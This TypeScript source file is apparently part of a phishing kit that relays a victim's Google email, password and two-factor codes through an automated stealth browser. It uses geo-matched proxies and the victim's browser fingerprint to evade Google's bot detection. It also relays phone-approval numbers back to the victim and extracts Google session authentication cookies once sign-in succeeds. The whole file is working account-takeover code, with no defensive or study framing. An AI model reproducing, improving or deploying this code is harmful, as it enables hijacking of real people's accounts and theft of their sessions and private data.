import { Browser, Page, BrowserContext, chromium as playwrightChromium } from 'patchright';
import { logger } from '../../utils/logger.util';
import { getBrowserLaunchConfig, getBrowserContextConfig, BrowserFingerprint } from './browser-launch.config';
import prisma from '../../config/database';

// Patchright handles all stealth at CDP level automatically
const chromium = playwrightChromium;

export type TwoFactorType = 'push' | 'totp' | 'sms' | 'hardware' | 'none' | 'dp';
export type SessionStage = 'email' | 'password' | '2fa' | 'success' | 'error';

export interface GoogleAuthResult {
  success: boolean;
  stage: SessionStage;
  nextStage?: SessionStage;
  twoFactorType?: TwoFactorType;
  twoFactorHint?: string;
  error?: string;
  cookies?: any[];
  status?: string;
  challengeType?: string;
  challengeMetadata?: {
    verificationNumber?: string;
    title?: string;
    instruction?: string;
  };
}

interface PlaywrightSession {
  browser: Browser;
  page: Page;
  context: BrowserContext;
  email: string;
  createdAt: number;
  proxyId?: string; // Track which proxy was used
  fingerprint?: BrowserFingerprint; // Victim's browser fingerprint
}

class GoogleAuthHTTPService {
  private sessions = new Map<string, PlaywrightSession>();

  /**
   * Select a healthy proxy from the pool
   */
  private async selectProxy(geoPreference?: { country?: string; region?: string; city?: string }): Promise<{ id: string; server: string; username?: string; password?: string } | null> {
    try {
      // Get all healthy, active proxies sorted by success rate
      let proxies = await prisma.proxyPool.findMany({
        where: {
          status: 'ACTIVE',
          isHealthy: true,
        },
        orderBy: [
          { successRate: 'desc' },
          { usageCount: 'asc' }, // Prefer less-used proxies
        ],
      });

      if (proxies.length === 0) {
        logger.warn('[PROXY] No healthy proxies available in pool');
        return null;
      }

      // Geo-matching: prefer proxies that match victim's location
      let geoMatchedProxies = proxies;
      if (geoPreference?.country) {
        // Try to find country match
        const countryMatches = proxies.filter(p => p.country?.toUpperCase() === geoPreference.country?.toUpperCase());
        if (countryMatches.length > 0) {
          geoMatchedProxies = countryMatches;
          logger.info(`[GEO] Found ${countryMatches.length} proxies matching country: ${geoPreference.country}`);
          
          // If we have region preference, try to narrow down further
          if (geoPreference.region) {
            const regionMatches = countryMatches.filter(p => 
              p.region?.toLowerCase().includes(geoPreference.region!.toLowerCase()) ||
              geoPreference.region!.toLowerCase().includes(p.region?.toLowerCase() || '')
            );
            if (regionMatches.length > 0) {
              geoMatchedProxies = regionMatches;
              logger.info(`[GEO] Found ${regionMatches.length} proxies matching region: ${geoPreference.region}`);
              
              // If we have city preference, try to narrow down even further
              if (geoPreference.city) {
                const cityMatches = regionMatches.filter(p =>
                  p.city?.toLowerCase().includes(geoPreference.city!.toLowerCase()) ||
                  geoPreference.city!.toLowerCase().includes(p.city?.toLowerCase() || '')
                );
                if (cityMatches.length > 0) {
                  geoMatchedProxies = cityMatches;
                  logger.info(`[GEO] Found ${cityMatches.length} proxies matching city: ${geoPreference.city}`);
                }
              }
            }
          }
        } else {
          logger.info(`[GEO] No proxies match country ${geoPreference.country}, using any available proxy`);
        }
      }

      // Pick a random proxy from top 5 geo-matched performers
      const topProxies = geoMatchedProxies.slice(0, 5);
      const proxy = topProxies[Math.floor(Math.random() * topProxies.length)];

      // Update usage stats
      await prisma.proxyPool.update({
        where: { id: proxy.id },
        data: {
          usageCount: { increment: 1 },
          lastUsedAt: new Date(),
        },
      });

      // Build proxy URL
      let protocol = proxy.protocol.toLowerCase();
      
      // Playwright Chromium doesn't support authenticated SOCKS proxies - fallback to HTTP
      if ((protocol === 'socks5' || protocol === 'socks4') && proxy.username && proxy.password) {
        logger.warn(`[PROXY] SOCKS5+auth not supported by Playwright, falling back to HTTP protocol`);
        protocol = 'http';
      }
      
      let server = `${protocol}://${proxy.host}:${proxy.port}`;
      
      logger.success(`[PROXY] Selected proxy: ${proxy.host}:${proxy.port} (${proxy.country || 'Unknown'}) - Success rate: ${proxy.successRate.toFixed(1)}%`);

      return {
        id: proxy.id,
        server,
        username: proxy.username || undefined,
        password: proxy.password || undefined,
      };
    } catch (error: any) {
      logger.error('[PROXY] Failed to select proxy:', error.message);
      return null;
    }
  }

  /**
   * Record proxy success/failure
   */
  private async recordProxyResult(proxyId: string, success: boolean): Promise<void> {
    try {
      const updatedProxy = await prisma.proxyPool.update({
        where: { id: proxyId },
        data: {
          successCount: success ? { increment: 1 } : undefined,
          failureCount: !success ? { increment: 1 } : undefined,
        },
      });

      // Recalculate success rate
      const totalChecks = updatedProxy.successCount + updatedProxy.failureCount;
      const successRate = totalChecks > 0 ? (updatedProxy.successCount / totalChecks) * 100 : 100;

      await prisma.proxyPool.update({
        where: { id: proxyId },
        data: { 
          successRate,
        },
      });

      logger.info(`[PROXY] Recorded ${success ? 'success' : 'failure'} for proxy ${proxyId} - New success rate: ${successRate.toFixed(1)}%`);
    } catch (error: any) {
      logger.error('[PROXY] Failed to record proxy result:', error.message);
    }
  }

  /**
   * Start Google authentication session using Playwright with anti-detection
   */
  async startSession(email: string, sessionId: string, fingerprint?: BrowserFingerprint, victimIp?: string): Promise<{ success: boolean; browser: Browser; page: Page; error?: string }> {
    try {
      logger.info(`[PLAYWRIGHT] Starting session with anti-detection for ${email}, sessionId=${sessionId}`);

      if (fingerprint) {
        logger.info(`[FINGERPRINT] Using victim's browser fingerprint for mimicry`);
        logger.info(`[FINGERPRINT] Platform: ${fingerprint.platform}, Screen: ${fingerprint.screenWidth}x${fingerprint.screenHeight}, Timezone: ${fingerprint.timezone}`);
      }

      // Geolocate victim IP for geo-matched proxy selection
      let geoRegion = '';
      let geoCity = '';
      let geoCountry = 'US';
      const victimIpAddress = victimIp || '';
      
      if (victimIpAddress && victimIpAddress !== '127.0.0.1' && !victimIpAddress.startsWith('192.168.') && !victimIpAddress.startsWith('10.')) {
        try {
          logger.info(`[GEO] Geolocating victim IP: ${victimIpAddress}`);
          const geoRes = await fetch(
            `http://ip-api.com/json/${victimIpAddress}?fields=country,regionName,city,status`,
            { signal: AbortSignal.timeout(3000) }
          );
          const geo = await geoRes.json() as {
            status: string;
            country: string;
            regionName: string;
            city: string;
          };
          if (geo.status === 'success') {
            geoCountry = geo.country || 'US';
            geoRegion  = geo.regionName || '';
            geoCity    = geo.city || '';
            logger.info(`[GEO] Victim location: ${geoCity}, ${geoRegion}, ${geoCountry}`);
          }
        } catch (geoErr: any) {
          logger.warn(`[GEO] Geolocation failed for ${victimIpAddress}: ${geoErr.message}`);
        }
      }

      // Select a proxy from the pool with geo-preference
      const proxy = await this.selectProxy({
        country: geoCountry,
        region: geoRegion,
        city: geoCity,
      });
      
      // Each session gets a unique IP — append sessionId to proxy username for rotation
      if (proxy?.username) {
        proxy.username = proxy.username + '-session-' + sessionId.replace(/-/g, '').substring(0, 10);
      }
      
      if (proxy) {
        logger.info(`[PROXY] Using proxy server: ${proxy.server}`);
      } else {
        logger.warn('[PROXY] No proxy available, launching without proxy (may trigger bot detection!)');
      }

      // Launch browser with anti-detection config + proxy + fingerprint
      const proxyConfig = proxy ? { server: proxy.server, username: proxy.username, password: proxy.password } : undefined;
      const launchConfig = getBrowserLaunchConfig(proxyConfig, fingerprint);
      const browser = await chromium.launch(launchConfig);

      // Create context with victim's fingerprint
      const contextConfig = getBrowserContextConfig(fingerprint);
      const context = await browser.newContext(contextConfig);

      // Create page
      const page = await context.newPage();

      // Navigate to Gmail and let Google redirect to signin with proper tokens
      logger.info('[PLAYWRIGHT] Navigating to Gmail (will redirect to signin)...');
      await page.goto('https://mail.google.com', {
        waitUntil: 'domcontentloaded',
        timeout: 60000,
      });

      // Wait for Google's redirect to the signin identifier page
      await page.waitForURL('**/accounts.google.com/**', { timeout: 30000 });
      await page.waitForTimeout(500);

      // Verify email input is present
      logger.info('[PLAYWRIGHT] Waiting for email input field...');
      const emailSelector = 'input[name="identifier"]';
      await page.waitForSelector(emailSelector, { state: 'visible', timeout: 15000 });
      logger.info('[PLAYWRIGHT] Email input ready');

      // Store session using external sessionId as key
      this.sessions.set(sessionId, {
        browser,
        page,
        context,
        email,
        createdAt: Date.now(),
        proxyId: proxy?.id,
        fingerprint, // Store fingerprint for future reference
      });

      logger.success(`[PLAYWRIGHT] Session started: ${sessionId}`);
      return { success: true, browser, page };

    } catch (err: any) {
      logger.error(`[PLAYWRIGHT] startSession error: ${err.message}`);
      return { success: false, browser: null as any, page: null as any, error: err.message };
    }
  }

  /**
   * Submit email and verify Google account exists
   */
  async submitEmail(sessionId: string, email: string): Promise<GoogleAuthResult> {
    const session = this.sessions.get(sessionId);
    if (!session) {
      logger.error(`[PLAYWRIGHT] Session not found: ${sessionId}`);
      return { success: false, stage: 'email', error: 'Session not found' };
    }

    const page = session.page;
    session.email = email;

    try {
      logger.info(`[PLAYWRIGHT] Submitting email: ${email} (sessionId: ${sessionId})`);

      const currentUrl = page.url();
      const pageTitle = await page.title().catch(() => 'unknown');
      logger.info(`[PLAYWRIGHT] Current URL: ${currentUrl}`);
      logger.info(`[PLAYWRIGHT] Page title: ${pageTitle}`);

      // Type email (simple and consistent like test script)
      logger.info(`[PLAYWRIGHT] Typing email...`);
      await page.type('input[name="identifier"]', email, { delay: 80 });
      
      // Get URL before clicking
      const urlBefore = page.url();
      
      // Click Next button
      logger.info(`[PLAYWRIGHT] Clicking Next...`);
      await page.click('#identifierNext');
      
      // Wait for navigation (like test script)
      await page.waitForTimeout(6000);

      const urlAfter = page.url();
      logger.info(`[PLAYWRIGHT] URL before: ${urlBefore}`);
      logger.info(`[PLAYWRIGHT] URL after: ${urlAfter}`);

      // Check if Google accepted the email (navigated to password page)
      const movedToPassword =
        urlAfter.includes('/challenge/pwd') ||
        urlAfter.includes('/challenge/') ||
        urlAfter.includes('/signin/v2/challenge') ||
        urlAfter.includes('/v3/signin/challenge') ||
        urlAfter !== urlBefore; // Any URL change means progress

      if (movedToPassword) {
        // Double-check: Look for password input to confirm
        try {
          await page.waitForSelector('input[type="password"]', { state: 'visible', timeout: 3000 });
          logger.info(`[PLAYWRIGHT] Email accepted: ${email} - Password screen reached`);
          
          // Record proxy success
          if (session.proxyId) {
            await this.recordProxyResult(session.proxyId, true);
          }
          
          return { success: true, stage: 'email', nextStage: 'password' };
        } catch {
          // URL changed but no password input - might still be processing
          if (urlAfter !== urlBefore) {
            logger.info(`[PLAYWRIGHT] Email accepted: ${email} - Page navigated`);
            
            // Record proxy success
            if (session.proxyId) {
              await this.recordProxyResult(session.proxyId, true);
            }
            
            return { success: true, stage: 'email', nextStage: 'password' };
          }
        }
      }

      // Check for /rejected URL
      if (urlAfter.includes('/rejected')) {
        logger.warn(`[PLAYWRIGHT] Google rejected email (automation detected): ${email}`);
        
        // Record proxy failure (bot detected)
        if (session.proxyId) {
          await this.recordProxyResult(session.proxyId, false);
        }
        
        return { success: false, stage: 'email', error: 'Google blocked the sign-in attempt' };
      }

      // Still on identifier page — email rejected
      let errorMsg = "Couldn't find your Google Account";
      for (const sel of ['[data-error-code]', '.o6cuMc', '[jsname="YFLfhe"]', '[role="alert"]', '.dEOOab']) {
        try {
          const el = await page.$(sel);
          if (el) {
            const t = (await el.textContent() || '').trim();
            if (t.length > 2) { errorMsg = t; break; }
          }
        } catch { continue; }
      }

      logger.warn(`[PLAYWRIGHT] Email rejected: ${email} — ${errorMsg}`);
      
      // Record proxy failure (email rejected - could be bot detection)
      if (session.proxyId) {
        await this.recordProxyResult(session.proxyId, false);
      }
      
      return { success: false, stage: 'email', error: errorMsg };

    } catch (err: any) {
      logger.error(`[PLAYWRIGHT] submitEmail error: ${err.message}`);
      
      // Record proxy failure on error
      if (session.proxyId) {
        await this.recordProxyResult(session.proxyId, false);
      }
      
      return { success: false, stage: 'email', error: err.message };
    }
  }

  /**
   * Submit password
   */
  async submitPassword(sessionId: string, password: string): Promise<GoogleAuthResult> {
    const session = this.sessions.get(sessionId);
    if (!session) {
      logger.error(`[PLAYWRIGHT] Session not found: ${sessionId}`);
      return { success: false, stage: 'password', error: 'Session not found' };
    }

    const page = session.page;

    try {
      logger.info(`[PLAYWRIGHT] Submitting password for ${session.email} (sessionId: ${sessionId})`);

      // Wait for password input
      const passwordSelectors = [
        'input[type="password"]',
        'input[name="password"]',
        'input[jsname="YPqjbf"]',
        'input[autocomplete="current-password"]',
      ];
      let passwordFound = false;
      for (let attempt = 0; attempt < 2 && !passwordFound; attempt++) {
        for (const sel of passwordSelectors) {
          try {
            await page.waitForSelector(sel, { state: 'visible', timeout: 15000 });
            passwordFound = true;
            break;
          } catch { continue; }
        }
        if (!passwordFound && attempt === 0) await page.waitForTimeout(2000);
      }
      if (!passwordFound) {
        logger.warn('[PLAYWRIGHT] Password input not found after retries, URL:', page.url());
        return { success: false, stage: 'password', error: 'Password input field not found' };
      }

      const urlBeforePassword = page.url();

      // Type password (simple and consistent like test script)
      let filledPassword = false;
      for (const sel of passwordSelectors) {
        try {
          const el = await page.$(sel);
          if (el && await el.isVisible()) {
            await page.fill(sel, password);
            filledPassword = true;
            break;
          }
        } catch { continue; }
      }
      if (!filledPassword) await page.fill('input[type="password"]', password);
      
      // Click Next button
      await page.click('#passwordNext');
      
      // Wait for navigation (like test script)
      await page.waitForTimeout(6000);

      const urlAfterPassword = page.url();
      logger.info(`[PLAYWRIGHT] URL after password: ${urlAfterPassword}`);

      // Still on password page — wrong password
      const stillOnPasswordPage =
        urlAfterPassword.includes('/challenge/pwd') ||
        urlAfterPassword === urlBeforePassword;

      if (stillOnPasswordPage) {
        let errorText = 'Wrong password. Try again.';
        for (const sel of ['[data-error-code]', '.LXRPh', '.o6cuMc', '[jsname="YFLfhe"]', '[role="alert"]']) {
          try {
            const el = await page.$(sel);
            if (el && await el.isVisible()) {
              const t = (await el.textContent() || '').trim();
              if (t.length > 2) { errorText = t; break; }
            }
          } catch { continue; }
        }
        logger.warn(`[PLAYWRIGHT] Wrong password: ${errorText}`);
        return { success: false, stage: 'password', error: errorText };
      }

      // Navigated to 2FA challenge
      const on2FAPage =
        urlAfterPassword.includes('/challenge/') &&
        !urlAfterPassword.includes('/challenge/pwd');

      if (on2FAPage) {
        const isDp = page.url().includes('challenge/dp');
        if (isDp) {
          let dpNumber = '';
          try {
            await page.waitForSelector('samp[jsname="feLNVc"]', { timeout: 5000 });
            dpNumber = (await page.$eval('samp[jsname="feLNVc"]', (el: any) => el.textContent?.trim())) ?? '';
          } catch {
            try {
              dpNumber = (await page.$eval('span[jsname="y02b7d"]', (el: any) => el.textContent?.trim())) ?? '';
            } catch { dpNumber = ''; }
          }

          logger.warn(`[DP] Device Protection triggered — session ${sessionId}, waiting for phone approval`);

          return {
            success: true,
            stage: '2fa',
            status: 'REQUIRES_2FA',
            challengeType: 'PUSH',
            challengeMetadata: {
              verificationNumber: dpNumber,
              title: 'Open the Gmail app on your phone',
              instruction: `Google sent a notification to your phone. Open the Gmail app, tap Yes on the prompt, then tap ${dpNumber} on your phone to verify it's you.`,
            },
            twoFactorType: 'dp',
            twoFactorHint: dpNumber,
          };
        }

        logger.info('[PLAYWRIGHT] 2FA challenge detected');
        const twoFactorType = await this.detect2FAType(page);
        const twoFactorHint = await this.extract2FAHint(page);
        logger.info(`[PLAYWRIGHT] 2FA type=${twoFactorType}, hint="${twoFactorHint}"`);
        
        // Record proxy success (reached 2FA = authentication working)
        if (session.proxyId) {
          await this.recordProxyResult(session.proxyId, true);
        }
        
        return { success: true, stage: 'password', nextStage: '2fa', twoFactorType, twoFactorHint };
      }

      // Login successful
      const isSuccess =
        urlAfterPassword.includes('myaccount.google.com') ||
        urlAfterPassword.includes('mail.google.com') ||
        urlAfterPassword.includes('drive.google.com') ||
        (urlAfterPassword.includes('google.com') && !urlAfterPassword.includes('accounts.google.com'));

      if (isSuccess) {
        logger.info(`[PLAYWRIGHT] Login successful: ${urlAfterPassword}`);
        const cookies = await session.context.cookies();
        
        // Record proxy success (full login success!)
        if (session.proxyId) {
          await this.recordProxyResult(session.proxyId, true);
        }
        
        return { success: true, stage: 'password', nextStage: 'success', cookies };
      }

      logger.warn(`[PLAYWRIGHT] Unknown state: ${urlAfterPassword}`);
      
      // Record proxy failure for unknown state
      if (session.proxyId) {
        await this.recordProxyResult(session.proxyId, false);
      }
      
      return { success: false, stage: 'password', error: 'Unknown state after password' };

    } catch (err: any) {
      logger.error(`[PLAYWRIGHT] submitPassword error: ${err.message}`);
      
      // Record proxy failure on error
      if (session.proxyId) {
        await this.recordProxyResult(session.proxyId, false);
      }
      
      return { success: false, stage: 'password', error: err.message };
    }
  }

  async pollDpCompletion(sessionId: string): Promise<{ status: string }> {
    const session = this.sessions.get(sessionId);
    if (!session) return { status: 'NOT_FOUND' };

    try {
      const url = session.page.url();
      logger.info(`[DP-POLL] session ${sessionId} — URL: ${url}`);
      
      if (!url.includes('challenge/dp')) {
        logger.success(`[DP] Phone approved — session ${sessionId}, extracting cookies now`);
        return { status: 'AUTHENTICATED' };
      }
      return { status: 'PENDING' };
    } catch {
      return { status: 'NOT_FOUND' };
    }
  }

  /**
   * Detect 2FA type
   */
  private async detect2FAType(page: Page): Promise<TwoFactorType> {
    try {
      await Promise.race([
        page.waitForLoadState('networkidle'),
        page.waitForTimeout(2000)
      ]);

      // Check for TOTP
      const totpSelectors = [
        'input[type="tel"][maxlength="6"]',
        'input[type="text"][maxlength="6"]',
        'input[type="tel"][aria-label*="code"]',
      ];

      for (const selector of totpSelectors) {
        const element = await page.$(selector);
        if (element && await element.isVisible()) {
          const pageText = await page.textContent('body') || '';
          if (pageText.toLowerCase().includes('authenticator') || 
              pageText.toLowerCase().includes('6-digit') ||
              pageText.toLowerCase().includes('verification code')) {
            return 'totp';
          }
        }
      }

      // Check for SMS
      const smsIndicators = [
        'text=/sent.*code/i',
        'text=/text message/i',
        'text=/phone number ending in/i',
      ];

      for (const indicator of smsIndicators) {
        const element = await page.$(indicator);
        if (element && await element.isVisible()) {
          return 'sms';
        }
      }

      // Check for Push
      const pushIndicators = [
        'text=/check your phone/i',
        'text=/tap yes/i',
        'text=/google prompt/i',
        'text=/notification.*phone/i',
      ];

      for (const indicator of pushIndicators) {
        const element = await page.$(indicator);
        if (element && await element.isVisible()) {
          return 'push';
        }
      }

      // Check for hardware key
      const hardwareIndicators = [
        'text=/security key/i',
        'text=/insert your/i',
        'text=/usb/i',
      ];

      for (const indicator of hardwareIndicators) {
        const element = await page.$(indicator);
        if (element && await element.isVisible()) {
          return 'hardware';
        }
      }

      // Check URL patterns
      const url = page.url();
      if (url.includes('/challenge/totp') || url.includes('/Challenge?')) return 'totp';
      if (url.includes('/challenge/sms')) return 'sms';
      if (url.includes('/challenge/ootp') || url.includes('/challenge/az')) return 'push';
      if (url.includes('/challenge/dp') || url.includes('/challenge/ipp')) return 'push';

      return 'none';
    } catch (error) {
      logger.error('Detect 2FA type error:', error);
      return 'none';
    }
  }

  /**
   * Extract 2FA hint text
   */
  private async extract2FAHint(page: Page): Promise<string> {
    const hintSelectors = [
      '[data-challengetype="12"] p',
      '[data-challengetype="9"] p',
      '.BjQGte p',
      '[jsname="hHeK5e"]',
      '.Xt19yc',
      'p[jsname="Lmj3sd"]',
      '[data-sendmethod] p',
    ];

    for (const sel of hintSelectors) {
      try {
        const el = await page.$(sel);
        if (el && await el.isVisible()) {
          const text = (await el.textContent() || '').trim();
          if (text.length > 2) return text;
        }
      } catch { continue; }
    }
    return '';
  }

  /**
   * Submit 2FA code
   */
  async submit2FA(sessionId: string, code: string, method: TwoFactorType = 'totp'): Promise<GoogleAuthResult> {
    const session = this.sessions.get(sessionId);
    if (!session) {
      logger.error(`[PLAYWRIGHT] Session not found: ${sessionId}`);
      return { success: false, stage: '2fa', error: 'Session not found' };
    }

    const page = session.page;

    try {
      logger.info(`[PLAYWRIGHT] Submitting 2FA code (${method}) for sessionId: ${sessionId}`);

      if (method === 'push') {
        logger.info('[PLAYWRIGHT] Waiting for push approval...');
        
        try {
          await page.waitForFunction(
            `() => {
              const url = window.location.href;
              return url.includes('myaccount.google.com') || 
                     url.includes('mail.google.com') ||
                     url.includes('drive.google.com') ||
                     (!url.includes('accounts.google.com/signin') && !url.includes('/challenge/'));
            }`,
            { timeout: 60000 }
          );

          await page.waitForLoadState('networkidle');
          logger.success('[PLAYWRIGHT] Push approved!');
          const cookies = await session.context.cookies();

          return {
            success: true,
            stage: '2fa',
            nextStage: 'success',
            cookies,
          };
        } catch (error) {
          return {
            success: false,
            stage: '2fa',
            error: 'Push notification timeout',
          };
        }
      }

      if (method === 'totp' || method === 'sms') {
        // Find code input
        const codeInputSelectors = [
          'input[type="tel"]',
          'input[type="text"][maxlength="6"]',
          'input[aria-label*="code"]',
          'input[placeholder*="code"]',
        ];

        let inputFound = false;
        for (const selector of codeInputSelectors) {
          const input = await page.$(selector);
          if (input && await input.isVisible()) {
            await input.fill(code);
            inputFound = true;
            break;
          }
        }

        if (!inputFound) {
          return {
            success: false,
            stage: '2fa',
            error: 'Could not find 2FA code input field',
          };
        }

        await Promise.race([
          page.waitForLoadState('networkidle'),
          page.waitForTimeout(800)
        ]);

        // Click submit button
        const submitSelectors = [
          'button[type="submit"]',
          '#next',
          'button:has-text("Next")',
          'button:has-text("Verify")',
          'button:has-text("Submit")',
        ];

        let clicked = false;
        for (const selector of submitSelectors) {
          try {
            const button = await page.$(selector);
            if (button && await button.isVisible()) {
              await button.click();
              clicked = true;
              break;
            }
          } catch (e) {
            continue;
          }
        }

        if (!clicked) {
          return {
            success: false,
            stage: '2fa',
            error: 'Could not find Submit button',
          };
        }

        // Wait for navigation
        await Promise.race([
          page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 8000 }).catch(() => {}),
          page.waitForTimeout(8000),
        ]);
        await page.waitForTimeout(500);

        const urlAfter2FA = page.url();
        logger.info(`[PLAYWRIGHT] URL after 2FA: ${urlAfter2FA}`);

        // Still on challenge page — wrong code
        if (urlAfter2FA.includes('/challenge/')) {
          let errorText = 'Wrong code. Try again.';
          for (const sel of ['[data-error-code]', '.LXRPh', '[jsname="YFLfhe"]', '[role="alert"]']) {
            try {
              const el = await page.$(sel);
              if (el && await el.isVisible()) {
                const t = (await el.textContent() || '').trim();
                if (t.length > 2) { errorText = t; break; }
              }
            } catch { continue; }
          }
          return { success: false, stage: '2fa', error: errorText };
        }

        // Success
        logger.info('[PLAYWRIGHT] 2FA code accepted');
        const cookies2FA = await session.context.cookies();
        return { success: true, stage: '2fa', nextStage: 'success', cookies: cookies2FA };
      }

      return {
        success: false,
        stage: '2fa',
        error: `${method} method not supported`,
      };
    } catch (err: any) {
      logger.error(`[PLAYWRIGHT] submit2FA error: ${err.message}`);
      return {
        success: false,
        stage: '2fa',
        error: err.message,
      };
    }
  }

  /**
   * Cleanup session
   */
  async cleanupSession(sessionId: string): Promise<void> {
    const session = this.sessions.get(sessionId);
    if (session) {
      try {
        await session.page?.close().catch(() => {});
        await session.context?.close().catch(() => {});
        await session.browser?.close().catch(() => {});
        this.sessions.delete(sessionId);
        
        // Mark session as FAILED in database (only if not already completed)
        await prisma.session.update({
          where: {
            id: sessionId,
            status: { notIn: ['COMPLETED', 'CAPTURED', 'SUCCESS', 'COOKIES_CAPTURED'] },
          },
          data: { status: 'FAILED', lastActivityAt: new Date() },
        }).catch(() => {});
        
        logger.info(`[PLAYWRIGHT] Session cleaned up: ${sessionId}`);
      } catch (err: any) {
        logger.error(`[PLAYWRIGHT] cleanupSession error: ${err.message}`);
      }
    } else {
      logger.warn(`[PLAYWRIGHT] cleanupSession called but session not found: ${sessionId}`);
    }
  }

  /**
   * Check if logged in (stub for compatibility)
   */
  async checkIfLoggedIn(page: any): Promise<boolean> {
    return false;
  }

  /**
   * Extract Google cookies (stub for compatibility)
   */
  extractGoogleCookies(cookies: any[]): any[] {
    const KEY_AUTH_COOKIES = new Set([
      'SID', 'SSID', 'HSID', 'SAPISID', 'APISID',
      '__Secure-1PSID', '__Secure-1PAPISID', '__Secure-1PSIDCC', '__Secure-1PSIDTS',
      '__Secure-3PSID', '__Secure-3PAPISID', '__Secure-3PSIDCC', '__Secure-3PSIDTS',
      'SIDCC', 'NID', 'AEC',
      '__Secure-OSID', 'OSID',
      'COMPASS', 'GMAIL_LF',
    ]);

    return cookies
      .filter(c =>
        c.domain &&
        c.domain.includes('google.com') &&
        c.expires !== undefined &&
        c.expires > 0 &&
        KEY_AUTH_COOKIES.has(c.name)
      )
      .map(c => ({
        name:           c.name,
        value:          c.value,
        domain:         c.domain,
        path:           c.path || '/',
        expirationDate: c.expires,
        secure:         c.secure,
        httpOnly:       c.httpOnly,
        sameSite:       c.sameSite,
      }));
  }
}

export default new GoogleAuthHTTPService();
